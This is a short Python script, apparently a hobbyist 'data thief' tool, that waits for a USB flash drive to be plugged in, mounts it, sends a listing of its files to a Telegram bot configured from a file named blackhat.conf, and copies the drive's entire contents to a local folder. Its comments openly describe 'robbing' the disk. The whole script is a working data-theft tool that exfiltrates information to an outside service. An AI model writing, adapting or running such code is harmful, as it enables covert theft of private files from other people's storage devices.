#!/usr/bin/python
import time
import os
from telegram import Telegram

telegram = Telegram("/mnt/blackhat.conf")

def bash(cmd, sudo=False, suppress_output=False):
    if sudo:
        cmd = f"sudo {cmd}"

    if suppress_output:
        cmd = f"{cmd} 2>/dev/null"

    return os.popen(cmd).read()


if __name__ == "__main__":
    f_name  = "/mnt/data_thief/"  # Where should we extract the data to
    disk_name = "/dev/sda1"       # Name of disk we're robbing
    mount_point = "~/media/"

    # Check to see where we're running this
    system = bash("cat /etc/os-release")
    if "Buildroot" not in system.split("\n")[0]:
        f_name = "~/data_thief/"
        sudo = True
    else:
        sudo = False

    bash(f"mkdir {f_name}", sudo, suppress_output=True)
    bash(f"mkdir {mount_point}", sudo, suppress_output=True)

    retries = 0
    print("Insert Flash Drive")
    while(True):
        time.sleep(1)
        output = bash(f"file {disk_name}", sudo)
        if "No such file or directory" in output:
            retries += 1
            if retries > 10:
                print("No drive, quitting")
                exit()
            else:
                print("No drive, retrying")
                continue
        elif "/dev/sda1" in output:
            print("Mounting")
            break

    bash(f"mount {disk_name} {mount_point}", sudo)
    print("Disk Mounted...")
    print("Contents...")
    con = bash(f"ls -1 --color=never {mount_point}")
    print(con)
    telegram.send(f"{con}")

    print("Copying Contents")
    bash(f"cp -r {mount_point}* {f_name}", sudo)
    print("Done")

    bash(f"umount {mount_point}", sudo)
